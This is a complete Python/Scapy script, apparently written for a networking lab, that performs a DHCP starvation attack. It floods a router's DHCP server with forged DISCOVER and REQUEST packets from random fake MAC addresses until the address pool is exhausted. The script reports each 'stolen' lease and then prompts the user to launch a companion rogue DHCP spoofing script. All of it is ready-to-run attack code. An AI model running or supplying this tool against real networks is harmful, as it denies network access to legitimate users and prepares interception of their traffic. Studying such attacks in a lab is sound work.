#!/usr/bin/env python3
# ══════════════════════════════════════════════════════
#  DHCP Starvation Attack - Fines Academicos
#  Scapy version: 2.5.0
# ══════════════════════════════════════════════════════

from scapy.all import *
import random
import os
import sys
import signal
import threading
import time
import argparse  

# ─────────────────────────────────────────
#  CONFIGURACION POR DEFECTO
# ─────────────────────────────────────────
PACKET_DELAY    = 0.01
BURST_SIZE      = 10
BURST_DELAY     = 0.1

# ── IMPORTANTE: Solo agotamos el rango del vIOS ──────
STARVE_IP_START = "192.168.89.1"     # Inicio pool vIOS
STARVE_IP_END   = "192.168.89.149"   # Fin pool vIOS

# ─────────────────────────────────────────
#  ESTADO GLOBAL
# ─────────────────────────────────────────
counter = {
    "sent"     : 0,
    "discover" : 0,
    "request"  : 0,
    "ack"      : 0,
}
used_macs   = set()
active_xids = {}
leases      = {}
stop_flag   = False
INTERFACE   = None  # Se define por argumento

# ─────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────
def log(msg_type, msg):
    colors = {
        "INFO" : "\033[94m",
        "OK"   : "\033[92m",
        "WARN" : "\033[93m",
        "ERR"  : "\033[91m",
        "PKT"  : "\033[96m",
        "STAR" : "\033[95m",
    }
    reset = "\033[0m"
    ts    = time.strftime("%H:%M:%S")
    color = colors.get(msg_type, "")
    print(f"[{ts}] {color}[{msg_type}]{reset} {msg}")

def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0x00, 0xFF) for _ in range(5)
    )

def unique_mac():
    while True:
        mac = random_mac()
        if mac not in used_macs:
            used_macs.add(mac)
            return mac

def mac_to_bytes(mac_str):
    parts = mac_str.split(":")
    raw   = bytes(int(p, 16) for p in parts)
    return raw + b"\x00" * 10

def random_xid():
    return random.randint(1, 0xFFFFFFFF)

def pool_exhausted():
    import ipaddress
    start = int(ipaddress.IPv4Address(STARVE_IP_START))
    end   = int(ipaddress.IPv4Address(STARVE_IP_END))
    total = end - start + 1
    return len(leases) >= total

# ─────────────────────────────────────────
#  CONSTRUCCION DE PAQUETES
# ─────────────────────────────────────────
def build_dhcp_discover(fake_mac):
    xid    = random_xid()
    chaddr = mac_to_bytes(fake_mac)

    pkt = (
        Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(
            op=1,
            htype=1,
            hlen=6,
            xid=xid,
            flags=0x8000,
            chaddr=chaddr,
        ) /
        DHCP(options=[
            ("message-type",   "discover"),
            ("hostname",       "host-" + fake_mac.replace(":", "")[-6:]),
            ("param_req_list", [1, 3, 6, 15, 28, 51]),
            "end"
        ])
    )
    return pkt, xid

def build_dhcp_request(fake_mac, offered_ip, server_ip, xid):
    import ipaddress

    offered   = int(ipaddress.IPv4Address(offered_ip))
    range_min = int(ipaddress.IPv4Address(STARVE_IP_START))
    range_max = int(ipaddress.IPv4Address(STARVE_IP_END))

    if not (range_min <= offered <= range_max):
        log("WARN", f"IP {offered_ip} fuera del rango vIOS, ignorando")
        return None

    chaddr = mac_to_bytes(fake_mac)

    pkt = (
        Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(
            op=1,
            htype=1,
            hlen=6,
            xid=xid,
            flags=0x8000,
            chaddr=chaddr,
        ) /
        DHCP(options=[
            ("message-type",  "request"),
            ("server_id",      server_ip),
            ("requested_addr", offered_ip),
            ("hostname",       "host-" + fake_mac.replace(":", "")[-6:]),
            "end"
        ])
    )
    return pkt

# ─────────────────────────────────────────
#  PROCESADOR DE RESPUESTAS
# ─────────────────────────────────────────
def handle_dhcp_response(packet):
    global INTERFACE
    
    if not (packet.haslayer(DHCP) and packet.haslayer(BOOTP)):
        return

    if packet[BOOTP].op != 2:
        return

    xid = packet[BOOTP].xid

    if xid not in active_xids:
        return

    fake_mac = active_xids[xid]

    dhcp_type = None
    server_ip = None
    for opt in packet[DHCP].options:
        if isinstance(opt, tuple):
            if opt[0] == "message-type":
                dhcp_type = opt[1]
            if opt[0] == "server_id":
                server_ip = opt[1]

    if dhcp_type == 2:
        offered_ip = packet[BOOTP].yiaddr
        log("PKT", f"OFFER recibido: {offered_ip} para MAC {fake_mac}")

        if server_ip:
            req_pkt = build_dhcp_request(fake_mac, offered_ip, server_ip, xid)
            if req_pkt:
                sendp(req_pkt, iface=INTERFACE, verbose=False)
                counter["request"] += 1
                log("OK", f"REQUEST enviado → robando {offered_ip} del vIOS")

    elif dhcp_type == 5:
        assigned_ip = packet[BOOTP].yiaddr
        leases[fake_mac] = assigned_ip
        counter["ack"] += 1
        active_xids.pop(xid, None)

        log("STAR", f"IP ROBADA: {assigned_ip} → {fake_mac} "
                    f"| Total: {len(leases)}/149")

        if pool_exhausted():
            log("STAR", "="*50)
            log("STAR", "POOL DEL vIOS COMPLETAMENTE AGOTADO!")
            log("STAR", "Lanza dhcp_spoof.py ahora en otra terminal")
            log("STAR", "="*50)

# ─────────────────────────────────────────
#  HILO LISTENER DE RESPUESTAS
# ─────────────────────────────────────────
def start_response_listener():
    global INTERFACE
    
    sniff(
        iface       = INTERFACE,
        filter      = "udp and port 68",
        prn         = handle_dhcp_response,
        store       = False,
        stop_filter = lambda p: stop_flag
    )

# ─────────────────────────────────────────
#  LOOP PRINCIPAL DE STARVATION
# ─────────────────────────────────────────
def starvation_loop():
    global INTERFACE
    
    log("INFO", "Iniciando DHCP Starvation loop...")
    log("INFO", f"Agotando rango: {STARVE_IP_START} → {STARVE_IP_END}")
    log("INFO", f"Respetando rango del Spoofing: 192.168.89.150 → 192.168.89.200\n")

    while not stop_flag:
        if pool_exhausted():
            log("STAR", "Pool agotado, starvation completado!")
            break

        for _ in range(BURST_SIZE):
            if stop_flag or pool_exhausted():
                break

            fake_mac      = unique_mac()
            discover, xid = build_dhcp_discover(fake_mac)
            active_xids[xid] = fake_mac

            sendp(discover, iface=INTERFACE, verbose=False)
            counter["sent"]     += 1
            counter["discover"] += 1

            time.sleep(PACKET_DELAY)

        time.sleep(BURST_DELAY)

# ─────────────────────────────────────────
#  MONITOR DE ESTADISTICAS
# ─────────────────────────────────────────
def stats_monitor():
    start_time = time.time()

    while not stop_flag:
        time.sleep(5)
        elapsed  = time.time() - start_time
        rate     = counter["sent"] / elapsed if elapsed > 0 else 0
        progress = (len(leases) / 149) * 100

        print(f"""
{'═'*60}
  DHCP STARVATION - ESTADÍSTICAS
{'─'*60}
  Rango objetivo   : {STARVE_IP_START} → {STARVE_IP_END}
  Rango spoofing   : 192.168.89.150  → 192.168.89.200 (libre)
  Tiempo activo    : {int(elapsed)}s
  MACs falsas      : {len(used_macs)}
  Discovers        : {counter['discover']}
  Requests         : {counter['request']}
  ACKs recibidos   : {counter['ack']}
  IPs robadas      : {len(leases)}/149  ({progress:.1f}%)
  Rate             : {rate:.1f} pkt/s
{'─'*60}
  PROGRESO: [{'█' * int(progress/5):<20}] {progress:.1f}%
{'═'*60}
        """)

        if leases:
            items = list(leases.items())[-5:]
            print("  ÚLTIMAS IPs ROBADAS:")
            for mac, ip in items:
                print(f"    {mac}  →  {ip}")
            print()

# ─────────────────────────────────────────
#  FUNCION PRINCIPAL
# ─────────────────────────────────────────
def dhcp_starvation(iface):
    global stop_flag, INTERFACE
    
    INTERFACE = iface  # Guardar interfaz global
    stop_flag = False

    attacker_real_mac = get_if_hwaddr(INTERFACE)

    print(f"""
╔══════════════════════════════════════════════════════════╗
║       DHCP Starvation Attack - Laboratorio               ║
╠══════════════════════════════════════════════════════════╣
║  Interfaz        : {INTERFACE:<37}║
║  MAC real        : {attacker_real_mac:<37}║
║  Agotando rango  : {STARVE_IP_START+' → '+STARVE_IP_END:<37}║
║  Libre (spoof)   : {'192.168.89.150 → 192.168.89.200':<37}║
╠══════════════════════════════════════════════════════════╣
║  PASO 1 → Este script agota el pool del vIOS             ║
║  PASO 2 → Lanzar dhcp_spoof.py en otra terminal          ║
╚══════════════════════════════════════════════════════════╝
    """)

    def cleanup(sig=None, frame=None):
        global stop_flag
        stop_flag = True
        print(f"\n\n[!] Starvation detenido.")
        print(f"[+] IPs robadas al vIOS : {len(leases)}/149")
        print(f"[+] Discovers enviados  : {counter['discover']}")
        if leases:
            print("\n[+] IPs robadas:")
            for mac, ip in list(leases.items())[:20]:
                print(f"    {mac} → {ip}")
            if len(leases) > 20:
                print(f"    ... y {len(leases)-20} más")
        sys.exit(0)

    signal.signal(signal.SIGINT,  cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    # Iniciar listener
    threading.Thread(target=start_response_listener, daemon=True).start()

    # Iniciar monitor
    threading.Thread(target=stats_monitor, daemon=True).start()

    # Lanzar starvation
    log("WARN", "Iniciando DHCP Starvation... (Ctrl+C para detener)\n")
    starvation_loop()

# ─────────────────────────────────────────
#  ENTRY POINT
# ─────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='DHCP Starvation Attack - Scapy 2.5.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  sudo python3 dhcp_starvation.py -i eth0
  sudo python3 dhcp_starvation.py -i wlan0
        """
    )
    
    parser.add_argument(
        '-i', '--interface',
        required=True,
        help='Interfaz de red (ej: eth0, wlan0)'
    )
    
    args = parser.parse_args()

    if os.getuid() != 0:
        print("[!] Ejecutar como root: sudo python3 dhcp_starvation.py -i <interfaz>")
        sys.exit(1)

    dhcp_starvation(args.interface)
